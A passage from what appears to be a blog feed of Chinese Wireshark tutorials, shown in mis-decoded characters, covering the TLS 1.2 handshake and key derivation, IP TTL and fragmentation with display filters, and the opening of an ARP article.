Diffie-HellmanEphemeralï¼ˆECDHEï¼‰æ—¶ï¼Œä»–ä»¬éœ€è¦äº¤æ¢ ECDHEç®—æ³•ä¸­ä½¿ç”¨çš„å…¬å…±å‚æ•°ã€‚åŠ å¯†ç»†èŠ‚è¶…å‡ºäº†è¿™é‡Œçš„èŒƒå›´ã€‚ä½†æ˜¯ï¼Œè¯·æ³¨æ„æ­¤å¤„å‘é€çš„ä¸‰ä¸ªçªå‡ºæ˜¾ç¤ºçš„å€¼ï¼š</p><ul><li>å‘½åæ›²çº¿ï¼šæœåŠ¡å™¨ä¸ºè®¡ç®—é€‰æ‹©çš„æ¤­åœ†æ›²çº¿ã€‚</li><li>å…¬é’¥ï¼šå®¢æˆ·ç«¯ä½¿ç”¨çš„æœåŠ¡å™¨çš„å…¬å…±ç»„ä»¶ã€‚</li><li>ç­¾åï¼šä½¿ç”¨æœåŠ¡å™¨çš„ç§æœ‰ RSAå¯†é’¥å¯¹å€¼è¿›è¡Œç­¾åï¼Œä»¥ä¾¿å®¢æˆ·ç«¯å¯ä»¥éªŒè¯ï¼ˆä½¿ç”¨è¯ä¹¦ä¸­çš„ç›¸åº”å…¬é’¥ï¼‰ECDHEå‚æ•°ç¡®å®æ¥è‡ªä¸å…¶é€šä¿¡çš„æœåŠ¡å™¨è€Œä¸æ˜¯æ”»å‡»è€…ã€‚</li></ul><p>â€œServer Hello doneâ€ æ„å‘³ç€ â€œServer Helloâ€ æŠ¥æ–‡çš„ç»“æŸ</p><h2id="client-key-exchange-change-cipher-spec-encrypted-handshake">ClientKey Exchange / Change Cipher Spec /Encrypted handshake</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/key_change.png"alt="key_change" /><figcaption aria-hidden="true">key_change</figcaption></figure><p><strong>Client Key Exchange</strong></p><p>â€œClient Key Exchangeâ€ åŒ…å«å®¢æˆ·ç«¯çš„ä¾› ECDHEä½¿ç”¨çš„å…¬å…±å‚æ•°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯å‚æ•°å¹¶æœªç­¾åã€‚</p><p>ç°åœ¨ï¼Œåœ¨æˆ‘ä»¬æŸ¥çœ‹ä¸Šé¢å±å¹•æˆªå›¾ä¸­çš„å…¶ä»–æ¶ˆæ¯ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆçœ‹çœ‹å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å¦‚ä½•ç”Ÿæˆå¯†é’¥ï¼ˆç§°ä¸ºä¸»å¯†é’¥ï¼‰ã€‚</p><p>æ ¹æ® 8.1 RFC 5246ï¼Œmaster_secret çš„å…¬å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">master_secret = PRF(pre_master_secret, &quot;master secret&quot;,   ClientHello.random + ServerHello.random)</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æåˆ°çš„* pre_master_secret *å®é™…ä¸Šæ˜¯æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä½¿ç”¨ ECDHEç®—æ³•è®¡ç®—çš„å¯†é’¥ã€‚ä¼ªéšæœºå‡½æ•°ï¼ˆPRFï¼‰å®é™…ä¸Šæ˜¯ HMAC-SHA256ã€‚ClientHello.random å’Œ ServerHello.random æ˜¯åœ¨åˆå§‹ helloæ¶ˆæ¯æœŸé—´åˆ†åˆ«ç”±å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç”Ÿæˆå’Œäº¤æ¢çš„éšæœºå€¼ã€‚å­—ç¬¦ä¸² â€œmaster secretâ€ä¹Ÿç”¨åœ¨ PRF ä¸­ã€‚ master_secret é•¿ 48 ä¸ªå­—èŠ‚ã€‚</p><p>è‡³äºä¸ºä»€ä¹ˆä¸€å®šè¦ç”¨ä¸‰ä¸ªéšæœºæ•°ï¼Œæ¥ç”Ÿæˆ"ä¼šè¯å¯†é’¥"ï¼Œ<ahref="http://blog.csdn.net/dog250/article/details/5717162">dog250</a>è§£é‡Šå¾—å¾ˆå¥½ï¼š</p><blockquote><p>"ä¸ç®¡æ˜¯å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡å™¨ï¼Œéƒ½éœ€è¦éšæœºæ•°ï¼Œè¿™æ ·ç”Ÿæˆçš„å¯†é’¥æ‰ä¸ä¼šæ¯æ¬¡éƒ½ä¸€æ ·ã€‚ç”±äºSSLåè®®ä¸­è¯ä¹¦æ˜¯é™æ€çš„ï¼Œå› æ­¤ååˆ†æœ‰å¿…è¦å¼•å…¥ä¸€ç§éšæœºå› ç´ æ¥ä¿è¯åå•†å‡ºæ¥çš„å¯†é’¥çš„éšæœºæ€§ã€‚</p><p>å¯¹äº RSA å¯†é’¥äº¤æ¢ç®—æ³•æ¥è¯´ï¼Œpre-master-key æœ¬èº«å°±æ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œå†åŠ ä¸Šhelloæ¶ˆæ¯ä¸­çš„éšæœºï¼Œä¸‰ä¸ªéšæœºæ•°é€šè¿‡ä¸€ä¸ªå¯†é’¥å¯¼å‡ºå™¨æœ€ç»ˆå¯¼å‡ºä¸€ä¸ªå¯¹ç§°å¯†é’¥ã€‚</p><p>pre master çš„å­˜åœ¨åœ¨äº SSLåè®®ä¸ä¿¡ä»»æ¯ä¸ªä¸»æœºéƒ½èƒ½äº§ç”Ÿå®Œå…¨éšæœºçš„éšæœºæ•°ï¼Œå¦‚æœéšæœºæ•°ä¸éšæœºï¼Œé‚£ä¹ˆ premaster secret å°±æœ‰å¯èƒ½è¢«çŒœå‡ºæ¥ï¼Œé‚£ä¹ˆä»…é€‚ç”¨ pre master secretä½œä¸ºå¯†é’¥å°±ä¸åˆé€‚äº†ï¼Œå› æ­¤å¿…é¡»å¼•å…¥æ–°çš„éšæœºå› ç´ ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åŠ ä¸Š premaster secretä¸‰ä¸ªéšæœºæ•°ä¸€åŒç”Ÿæˆçš„å¯†é’¥å°±ä¸å®¹æ˜“è¢«çŒœå‡ºäº†ï¼Œä¸€ä¸ªä¼ªéšæœºå¯èƒ½å®Œå…¨ä¸éšæœºï¼Œå¯æ˜¯æ˜¯ä¸‰ä¸ªä¼ªéšæœºå°±ååˆ†æ¥è¿‘éšæœºäº†ï¼Œæ¯å¢åŠ ä¸€ä¸ªè‡ªç”±åº¦ï¼Œéšæœºæ€§å¢åŠ çš„å¯ä¸æ˜¯ä¸€ã€‚"</p></blockquote><p>æ­¤æ—¶ï¼Œé‡è¦çš„æ˜¯æŒ‡å‡ºä¸€ä¸ªåœ¨ TLS è®°å½•åè®®ä¸­æ‰§è¡Œå…³äº master_secretçš„æ“ä½œã€‚ TLSè®°å½•åè®®æ˜¯ä¸€ä¸ªå•ç‹¬çš„å­åè®®ï¼Œç”¨äºå®é™…åŠ å¯†å’Œä¼ è¾“é«˜çº§åè®®æ•°æ®ï¼Œå¦‚HTTPã€‚ä½¿ç”¨ TLS è®°å½•åè®®ä¸­çš„ PRF å°†ä¸»å¯†é’¥â€œæ‰©å±•â€ä¸ºæ›´å¤šç§˜å¯†ã€‚ ä»master_secret æ´¾ç”Ÿçš„å¯†é’¥åœ¨ RFC è§„èŒƒçš„<ahref="https://tools.ietf.org/html/rfc5246#section-6.3">section6.3</a>ä¸­å‘½åå¦‚ä¸‹ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client_write_MAC_key[SecurityParameters.mac_key_length]   server_write_MAC_key[SecurityParameters.mac_key_length]   client_write_key[SecurityParameters.enc_key_length]      server_write_key[SecurityParameters.enc_key_length]      client_write_IV[SecurityParameters.fixed_iv_length]      server_write_IV[SecurityParameters.fixed_iv_length]</span><br></pre></td></tr></table></figure><p>å¯ä»¥çŒœæµ‹ï¼Œâ€œå†™å¯†é’¥â€ç”¨äºåŠ å¯†æ•°æ®ã€‚ â€œå†™ MACâ€ å¯†é’¥ç”¨äºè®¡ç®—åº”ç”¨çº§æ•°æ®çš„MACã€‚ä»…åœ¨å¯†ç å¥—ä»¶éœ€è¦æ—¶æ‰è®¡ç®—åˆå§‹åŒ–å‘é‡ï¼ˆIVï¼‰ã€‚ç”±äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½å…·æœ‰æ‰€æœ‰è¿™äº›å¯†é’¥ï¼Œå› æ­¤å®ƒä»¬å¯ä»¥è§£å¯†å¹¶éªŒè¯æ¶ˆæ¯çš„å®Œæ•´æ€§ã€‚</p><p><strong>Change Cipher Spec</strong></p><p>Change Cipher Spec æ˜¯ TLS ä¸­çš„ä¸€ä¸ªå•ç‹¬çš„å­åè®®ï¼Œç”¨äºæŒ‡ç¤º TLSåå•†ä¸­çš„ä»»ä½•ä¸€æ–¹å°†ä½¿ç”¨åå•†çš„å¯†é’¥å’Œç®—æ³•åŠ å¯†åç»­æ¶ˆæ¯ã€‚</p><p><strong>Encrypted Handshake Message (Finished Message)</strong></p><p>ä½ ä»¬ä¸­çš„ä¸€äº›äººå¯èƒ½æƒ³çŸ¥é“æ¡æ‰‹æ¶ˆæ¯ä¸­ä¸­é—´äººæ”»å‡»ï¼ˆMan-In-The-Middleï¼‰çš„å¯èƒ½æ€§ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ”»å‡»è€…æ”¹å˜å®¢æˆ·ç«¯å‘é€çš„å¯†ç å¥—ä»¶åˆ—è¡¨ä»¥ä½¿æœåŠ¡å™¨é€‰æ‹©ç›¸å¯¹è¾ƒå¼±çš„å¯†ç å¥—ä»¶ï¼Œè¯¥æ€ä¹ˆåŠï¼ŸTLS åè®®ç¡®å®ä½¿ç”¨ Finished Message æ¥é˜²æ­¢ MITM æ”»å‡»ï¼Œå®ƒåœ¨ Change CipherSpec æ¶ˆæ¯ä¹‹åå‘é€ã€‚ å±å¹•æˆªå›¾ä¸­çš„â€œåŠ å¯†æ¡æ‰‹æ¶ˆæ¯â€å°†æ˜¯ä¸€ä¸ª HMAC-SHA256ã€‚ä»–æœ‰ä¸‹åˆ—å±æ€§</p><ol type="1"><li>æœ‰ç€ ä¸»å¯†é’¥ï¼ˆmaster_secretï¼‰</li><li>æ‰€æœ‰å…ˆå‰æ¡æ‰‹æ¶ˆæ¯çš„å“ˆå¸Œå€¼ï¼ˆä» ClientHello åˆ° Finished Messageï¼Œä¸åŒ…æ‹¬æ­¤ Finished Message ï¼‰</li><li>ç»“æŸæ ‡å¿—å­—ç¬¦ä¸²ï¼ˆå®¢æˆ·ç«¯æ¶ˆæ¯ä¸ºâ€œclient finishedâ€ï¼ŒæœåŠ¡å™¨æ¶ˆæ¯ä¸ºâ€œserverfinishedâ€ï¼‰</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">verify_data</span><br><span class="line">PRF(master_secret, finished_label, Hash(handshake_messages))(quoted from section 7.4.9 of RFC 5246)</span><br></pre></td></tr></table></figure><p>å¦‚æœæœåŠ¡å™¨æˆ–å®¢æˆ·ç«¯æ— æ³•éªŒè¯æ¡æ‰‹æ¶ˆæ¯çš„å®Œæ•´æ€§ï¼Œåˆ™ TLS æ¡æ‰‹å¤±è´¥ã€‚</p><h2 id="encrypted-application-data">Encrypted Application Data</h2><p>åœ¨æ¡æ‰‹å®Œæˆåï¼Œä¼ é€åŠ å¯†çš„æ•°æ®ã€‚</p><ul><li>MAC-then-Encryptï¼šåœ¨æ˜æ–‡ä¸Šè®¡ç®—MACï¼Œå°†å…¶é™„åŠ åˆ°æ•°æ®ï¼Œç„¶ååŠ å¯†æ•´ä¸ªï¼ˆè¿™å°±æ˜¯<ahref="http://tools.ietf.org/html/rfc5246">TLS</a>æ‰€åšçš„ï¼‰</li><li>åŠ å¯†å’Œ MACï¼šåœ¨æ˜æ–‡ä¸Šè®¡ç®— MACï¼ŒåŠ å¯†æ˜æ–‡ï¼Œç„¶åå°† MACé™„åŠ åˆ°å¯†æ–‡çš„æœ«å°¾ï¼ˆè¿™å°±æ˜¯ SSH æ‰€åšçš„ï¼‰</li><li>Encrypt-then-MACï¼šåŠ å¯†æ˜æ–‡ï¼Œç„¶ååœ¨å¯†æ–‡ä¸Šè®¡ç®—MACï¼Œå¹¶å°†å…¶é™„åŠ åˆ°å¯†æ–‡ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¸è¦å¿˜è®°å°†åˆå§‹åŒ–çŸ¢é‡ï¼ˆIVï¼‰å’ŒåŠ å¯†æ–¹æ³•æ ‡è¯†ç¬¦åŒ…å«åœ¨MACed æ•°æ®ä¸­ï¼‰</li></ul><p>å‰ä¸¤ä¸ªé€‰é¡¹é€šå¸¸ç§°ä¸ºâ€œMAC-then-encryptâ€ï¼Œè€Œç¬¬ä¸‰ä¸ªé€‰é¡¹åˆ™æ˜¯â€œencrypt-then-MACâ€ã€‚</p><p>ç›´åˆ° TLS 1.2ï¼Œâ€œMAC-then-Encryptâ€ æŠ€æœ¯ä»ç„¶ç”¨æ¥ä»ä¸Šå±‚ï¼ˆ TLS recordåè®®ï¼‰åŠ å¯†å’Œä¿è¯æ•°æ®çš„å®Œæ•´æ€§ã€‚é¦–å…ˆï¼Œä½¿ç”¨ å®¢æˆ·ç«¯çš„ client_write_MAC_keyæˆ– æœåŠ¡ç«¯çš„ server_write_MAC_key æ¥åˆ›å»ºæ¶ˆæ¯çš„ MACï¼Œç„¶åæ˜æ–‡æ•°æ®å’Œ MACè¢«å®¢æˆ·ç«¯ä½¿ç”¨ client_write_key å’ŒæœåŠ¡ç«¯ä½¿ç”¨ server_write_keyå„è‡ªåŠ å¯†ã€‚</p><p>å‚è€ƒèµ„æ–™</p><blockquote><ol type="1"><li><a href="https://www.ietf.org/rfc/rfc5246.txt">RFC 5246</a></li><li><ahref="https://blog.csdn.net/mrpre/article/details/77868669">TLS/SSLä¼šè¯å¤ç”¨</a></li><li><ahref="https://medium.com/@ethicalevil/tls-handshake-protocol-overview-a39e8eee2cf5">TLS1.2 hand shake</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œåè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPåè®®</title>
      <link href="/blog/2019/07/07/wireshark/ip_protocol/"/>
      <url>/blog/2019/07/07/wireshark/ip_protocol/</url>
      
        <content type="html"><![CDATA[<p>ç›®çš„ï¼š</p><ol type="1"><li>IP åè®®çš„åŸºæœ¬æ¦‚å¿µä»¥åŠå®ƒåœ¨ OSI æ¨¡å‹ä¸­çš„ä½ç½®</li><li>å­˜æ´»æ—¶é—´ä»¥åŠ IP åˆ†ç‰‡çš„åŸºæœ¬æ¦‚å¿µ</li><li>å­¦ä¼šåˆ©ç”¨ Wireshark åˆ†ææ•è·æ–‡ä»¶ä¸­çš„ TTL å’Œ IP åˆ†ç‰‡</li><li>æŒæ¡æ•è· IP æ•°æ®åŒ…çš„æ–¹æ³•</li></ol><h2 id="ä¸¤ä¸ªé‡è¦æ¦‚å¿µ">ä¸¤ä¸ªé‡è¦æ¦‚å¿µï¼š</h2><h3 id="ttl">TTL</h3><p>TTL æ˜¯ç”Ÿå­˜æ—¶é—´çš„æ„æ€ï¼Œå°±æ˜¯è¯´è¿™ä¸ª pingçš„æ•°æ®åŒ…èƒ½åœ¨ç½‘ç»œä¸Šå­˜åœ¨å¤šå°‘æ—¶é—´ã€‚å½“æˆ‘ä»¬å¯¹ç½‘ç»œä¸Šçš„ä¸»æœºè¿›è¡Œ pingæ“ä½œçš„æ—¶å€™ï¼Œæœ¬åœ°æœºå™¨ä¼šå‘å‡ºä¸€ä¸ªæ•°æ®åŒ…ï¼Œæ•°æ®åŒ…ç»è¿‡ä¸€å®šæ•°é‡çš„è·¯ç”±å™¨ä¼ é€åˆ°ç›®çš„ä¸»æœºï¼Œä½†æ˜¯ç”±äºå¾ˆå¤šçš„åŸå› ï¼Œä¸€äº›æ•°æ®åŒ…ä¸èƒ½æ­£å¸¸ä¼ é€åˆ°ç›®çš„ä¸»æœºï¼Œé‚£å¦‚æœä¸ç»™è¿™äº›æ•°æ®åŒ…ä¸€ä¸ªç”Ÿå­˜æ—¶é—´çš„è¯ï¼Œè¿™äº›æ•°æ®åŒ…ä¼šä¸€ç›´åœ¨ç½‘ç»œä¸Šä¼ é€ï¼Œå¯¼è‡´ç½‘ç»œå¼€é”€çš„å¢å¤§ã€‚å½“æ•°æ®åŒ…ä¼ é€åˆ°ä¸€ä¸ªè·¯ç”±å™¨ä¹‹åï¼ŒTTLå°±è‡ªåŠ¨å‡ 1ï¼Œå¦‚æœå‡åˆ° 0 äº†è¿˜æ˜¯æ²¡æœ‰ä¼ é€åˆ°ç›®çš„ä¸»æœºï¼Œé‚£ä¹ˆå°±è‡ªåŠ¨ä¸¢å¤±</p><p>TTL çš„ä¸»è¦ä½œç”¨æ˜¯é¿å… IPåŒ…åœ¨ç½‘ç»œä¸­çš„æ— é™å¾ªç¯å’Œæ”¶å‘ï¼ŒèŠ‚çœäº†ç½‘ç»œèµ„æºï¼Œå¹¶èƒ½ä½¿ IPåŒ…çš„å‘é€è€…èƒ½æ”¶åˆ°å‘Šè­¦æ¶ˆæ¯</p><h3 id="ip-åˆ†ç‰‡">IP åˆ†ç‰‡</h3><h4 id="åŸç†">åŸç†</h4><p>IP åè®®ç†è®ºä¸Šå…è®¸çš„æœ€å¤§ IP æ•°æ®æŠ¥ä¸º 65535 å­—èŠ‚ï¼ˆ16ä½æ¥è¡¨ç¤ºåŒ…æ€»é•¿ï¼‰ã€‚ä½†æ˜¯å› ä¸ºåè®®æ ˆç½‘ç»œå±‚ä¸‹é¢çš„æ•°æ®é“¾è·¯å±‚ä¸€èˆ¬å…è®¸çš„å¸§é•¿è¿œè¿œå°äºè¿™ä¸ªå€¼ï¼Œä¾‹å¦‚ä»¥å¤ªç½‘çš„MTUï¼ˆå³ Maximum Transmission Unitï¼Œæœ€å¤§ä¼ è¾“å•å…ƒï¼‰é€šå¸¸åœ¨ 1500å­—èŠ‚å·¦å³ã€‚æ‰€ä»¥è¾ƒå¤§çš„ IP æ•°æ®åŒ…ä¼šè¢«åˆ†ç‰‡ä¼ é€’ç»™æ•°æ®é“¾è·¯å±‚å‘é€ï¼Œåˆ†ç‰‡çš„ IPæ•°æ®æŠ¥å¯èƒ½ä¼šä»¥ä¸åŒçš„è·¯å¾„ä¼ è¾“åˆ°æ¥æ”¶ä¸»æœºï¼Œæ¥æ”¶ä¸»æœºé€šè¿‡ä¸€ç³»åˆ—çš„é‡ç»„ï¼Œå°†å…¶è¿˜åŸä¸ºä¸€ä¸ªå®Œæ•´çš„IP æ•°æ®æŠ¥ï¼Œå†æäº¤ç»™ä¸Šå±‚åè®®å¤„ç†ã€‚ä¸Šå›¾ä¸­çš„çº¢è‰²å­—æ®µä¾¿æ˜¯è¢«è®¾è®¡ç”¨æ¥å¤„ç† IPæ•°æ®åŒ…åˆ†ç‰‡å’Œé‡ç»„çš„ã€‚</p><h2 id="æŠ“åŒ…åˆ†æ">æŠ“åŒ…åˆ†æ</h2><p>ï¼ˆè¿™é‡Œä½¿ç”¨å…¶ä»–æ—§ç‰ˆæ•™ç¨‹æˆªå›¾ï¼Œå› ä¸ºæˆ‘æ­»æ´»æŠ“ä¸åˆ°å¸¦å¤šä¸ªåˆ†ç‰‡çš„æ‰¹æ•°æ®åŒ…emmmï¼Œæ³¨æ„ï¼šæ–°ç‰ˆ Wireshark çš„ åç§»é‡ offset åœ¨ Flagsçš„å±•å¼€åˆ—è¡¨é‡Œï¼Œå¯¹ï¼Œæ–°ç‰ˆçš„ Flags é‚£é‡Œå¯ä»¥å±•å¼€æ˜¾ç¤ºæ ‡å¿—ä½åŠåç§»ï¼‰</p><p>æ§åˆ¶æ ‡å¿—ï¼š</p><blockquote><p>Bit 0: reserved, must be zero Bit 1:(DF) 0=May Fragment, 1=Don'tFragment. Bit 2:(MF) 0=Last Fragment, 1=More Fragments.</p></blockquote><p>å¯ä»¥åœ¨æ˜¾ç¤ºè¿‡æ»¤å™¨ä¸­ä½¿ç”¨ï¼Œä¸‹é¢ç»™å‡ºå‡ ä¸ªå¸¸ç”¨åŠŸèƒ½è¯­å¥ç¤ºä¾‹ï¼š</p><p>ip.flags.mf == 1 è¿‡æ»¤å‡ºä¸€ç³»åˆ—åˆ†ç‰‡çš„æ•°æ®å¸§é™¤å»æœ€åä¸€ä¸ªçš„å…¶ä»–å¸§</p><p>ip.flags.mf == 0 è¿‡æ»¤å‡ºä¸€ç³»åˆ—åˆ†ç‰‡çš„æ•°æ®å¸§çš„æœ€åä¸€ä¸ª</p><p>ip.frag_offset &gt; 0 è¿‡æ»¤å‡ºåˆ†ç‰‡æ•°æ®å¸§ä¸­åç§»é‡å¤§äº 0çš„æ•°æ®å¸§ï¼ˆå³ï¼šé™¤äº†ç¬¬ä¸€ä¸ªç‰‡å¸§ä¹‹å¤–çš„å…¶ä»–å¸§ï¼‰</p><p>ip.frag_offset==0 è¿‡æ»¤å‡ºç¬¬ä¸€ç‰‡å¸§ä»¥åŠæœªåˆ†ç‰‡çš„æ•°æ®</p><p>ip.flags.mf== 1 &amp;&amp; ip.frag_offset == 0 è¿‡æ»¤å‡ºç¬¬ä¸€ç‰‡å¸§</p><p>ip.flags.mf == 1 or ip.frag_offset &gt; 0è¿‡æ»¤å‡ºå‡ºå»ç¬¬ä¸€ç‰‡å’Œæœ€åä¸€ç‰‡çš„ç‰‡å¸§</p><p>ç¬¬ä¸€ç‰‡ï¼š</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/ip_fragment1.png"alt="First Fragment" /><figcaption aria-hidden="true">First Fragment</figcaption></figure><p>Identificationï¼šç”¨äºç‰‡çš„é‡ç»„ï¼Œå…·æœ‰ç›¸åŒ idetificationçš„ç‰‡é‡ç»„ä¸ºä¸€ä¸ªåˆ†ç»„ã€‚</p><p>Flags ä¸º 1ï¼Œæ„å‘³è¿™åé¢è¿˜æœ‰æ›´å¤šç‰‡å¸§</p><p>Fragment offset åç§»ä¸º 0ï¼Œæ„å‘³ç€å®ƒæ˜¯ç¬¬ä¸€ç‰‡å¸§</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/ip_fragment2.png"alt="Second Fragment" /><figcaption aria-hidden="true">Second Fragment</figcaption></figure><p>Identificationï¼šä¸ç¬¬ä¸€ç‰‡ç›¸åŒ</p><p>Flags ä¸º 1ï¼Œæ„å‘³è¿™åé¢è¿˜æœ‰æ›´å¤šç‰‡å¸§</p><p>Fragment offset åç§»ä¸º 1480ï¼Œå³ï¼šMTUï¼ˆ1500ï¼‰- IPheaderï¼ˆ20ï¼‰ï¼Œæ„å‘³ç€å®ƒæ˜¯ç¬¬äºŒç‰‡å¸§</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/ip_fragment3.png"alt="Third Fragment" /><figcaption aria-hidden="true">Third Fragment</figcaption></figure><p>Identificationï¼šä¸ç¬¬ä¸€ç‰‡ç›¸åŒ</p><p>Flags ä¸º 0ï¼Œæ„å‘³è¿™æ˜¯ä¸€ç³»åˆ—åˆ†ç‰‡çš„æœ€åä¸€ç‰‡å¸§</p><p>Fragment offset åç§»ä¸º 2960ï¼Œå³ï¼š1480 *2ï¼Œæ„å‘³ç€å®ƒæ˜¯ç¬¬ä¸‰ç‰‡å¸§ï¼Œæ°å¥½åˆ†ç‰‡åˆ†æ»¡ç»“æŸã€‚</p><p>å¤§ä½“å®Œæˆï¼Œå¾…å®Œå–„...</p><p>å‚è€ƒèµ„æ–™:</p><blockquote><ul><li><a href="https://my.oschina.net/xinxingegeya/blog/483138">IPæ•°æ®æŠ¥åˆ†ç‰‡â€”â€”Fragmentation å’Œé‡ç»„</a></li><li><a href="https://www.wireshark.org/docs/dfref/i/ip.html">ipç›¸å…³æ˜¾ç¤ºè¿‡æ»¤å™¨è¯­æ³•</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œåè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARPåè®®</title>
      <link href="/blog/2019/07/07/wireshark/arp_protocol/"/>
      <url>/blog/2019/07/07/wireshark/arp_protocol/</url>
      
        <content type="html"><![CDATA[<h1 id="ç›®çš„">ç›®çš„</h1><ol type="1"><li>å­¦ä¹  ARP åè®®åŸç†ï¼ŒæŒæ¡ ARP è¯·æ±‚æ•°æ®æŠ¥ä»¥åŠå“åº”æ•°æ®åŒ…çš„å„è‡ªç‰¹ç‚¹</li><li>å­¦ä¼šä½¿ç”¨ Wireshark åˆ†æ ARPæ•°æ®æŠ¥ï¼ŒæŒæ¡è¯·æ±‚ä»¥åŠå“åº”æ•°æ®æŠ¥çš„åˆ†ææ–¹æ³•ä»¥åŠå„è‡ªçš„ç‰¹ç‚¹ã€‚</li><li>åˆ†æå…è´¹ ARP çš„ç‰¹ç‚¹ï¼Œå¹¶ä¸æ­£å¸¸ ARP è¯·æ±‚çš„æ•°æ®æŠ¥ä½œå¯¹æ¯”</li></ol><h1 id="arpaddress-resolution-protocol">ARPï¼ˆAddress ResolutionProtocolï¼‰</h1><h2 id="ç®€ä»‹">ç®€ä»‹</h2><p>ARP çš„å…¨ç§°æ˜¯ Address Resolution Protocolï¼Œç›´è¯‘è¿‡æ¥æ˜¯<strong>åœ°å€è§£æåè®®</strong>ã€‚å¯¹åº”çš„ RFC æ–‡æ¡£æ˜¯ <ahref="https://tools.ietf.org/html/rfc826">RFC826</a>ã€‚å®ƒçš„ä½œç”¨æ˜¯æŠŠ IPåœ°å€è½¬æ¢ä¸º MAC åœ°å€ã€‚ä¸ºä»€ä¹ˆéœ€è¦åšè¿™ä»¶äº‹å‘¢ï¼Ÿ</p><p>è¿™æ˜¯å› ä¸º TCP/IP ç½‘ç»œåè®®æ ˆæ˜¯åˆ†å±‚çš„ï¼Œæ¯å±‚è´Ÿè´£ä¸åŒçš„åŠŸèƒ½ã€‚IP å±‚ï¼ˆlayer3ï¼‰è´Ÿè´£è·¯ç”±å¯»è·¯ï¼Œæ¢å¥è¯è¯´ï¼Œå¦‚æœç›®çš„æœºå™¨å’Œå®¢æˆ·ç«¯ä¸åœ¨åŒä¸€ä¸ªç½‘ç»œï¼ŒIPå±‚ä¼šç©¿è¿‡é”™ç»¼å¤æ‚çš„ä¸­é—´ç½‘ç»œï¼ˆäº’è”ç½‘ï¼‰æ‰¾åˆ°ç›®çš„æœºå™¨æ‰€åœ¨çš„ç½‘ç»œã€‚</p><p>å½“æŠ¥æ–‡åœ¨æŸä¸€ä¸ªç½‘ç»œä¸­ä¼ æ’­æ—¶ï¼ˆå¯èƒ½æºæœºå™¨å’Œç›®çš„æœºå™¨æœ¬æ¥å°±åœ¨åŒä¸€ä¸ªç½‘ç»œï¼Œä¹Ÿå¯èƒ½æŠ¥æ–‡åœ¨è·¯ç”±è¿‡ç¨‹ä¸­æ‰§è¡Œä¸‹ä¸€è·³æ­¥éª¤ï¼‰ï¼ŒIPå±‚çš„åŠŸèƒ½å°±æ²¡æœ‰ç”¨äº†ï¼Œè¿™æ—¶å€™èµ·ä½œç”¨çš„æ˜¯ 2å±‚ç½‘ç»œï¼ˆé“¾è·¯å±‚ï¼‰ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹å°±æ˜¯ä»¥å¤ªç½‘ã€‚ä»¥å¤ªç½‘è´Ÿè´£æŠŠå¤šä¸ªæœºå™¨è¿åˆ°ä¸€èµ·ï¼Œç»„æˆä¸€ä¸ªæœ€å°å•ä½çš„å±€åŸŸç½‘ã€‚åœ¨ä»¥å¤ªç½‘ä¸­ï¼Œä¸åŒæœºå™¨çš„æ ‡è¯†æ˜¯MAC åœ°å€ï¼ŒMAC åœ°å€æ˜¯æœºå™¨åœ¨ç”Ÿäº§çš„æ—¶å€™å‚å•†ä¸ºæœºå™¨è®¾å®šçš„ã€‚</p><p>æœ‰äº† MAC åœ°å€ï¼ŒåŒä¸€ä¸ªä»¥å¤ªç½‘ç»œä¸Šçš„ä¸¤å°æœºå™¨æ‰èƒ½å¤Ÿé€šä¿¡ã€‚æœºå™¨ Aéœ€è¦çŸ¥é“æœºå™¨ B çš„ MACåœ°å€ï¼Œæ‰èƒ½å‘é€ä»¥å¤ªç½‘å¸§ï¼›äº¤æ¢æœºæ”¶åˆ°æŠ¥æ–‡ä¹‹åï¼Œæ ¹æ®ç›®çš„ MACåœ°å€å†³å®šåº”è¯¥ä»å“ªä¸ªç«¯å£å‘é€å‡ºå»ï¼›ç›®çš„æœºå™¨è¯»å–æŠ¥æ–‡çš„ MACåœ°å€æ‰èƒ½çŸ¥é“æŠ¥æ–‡æ˜¯ä¸æ˜¯è¦å‘ç»™è‡ªå·±çš„ã€‚</p><p>æœ€å¼€å§‹çš„æ—¶å€™ï¼Œæœºå™¨ A åªçŸ¥é“ç›®çš„åœ°å€çš„ IPï¼ˆç”¨æˆ·ç”¨æŸç§æ–¹å¼è¾“å…¥ IPåœ°å€ï¼Œæˆ–è€…é€šè¿‡ DNS è§£æå‡ºæ¥ IP 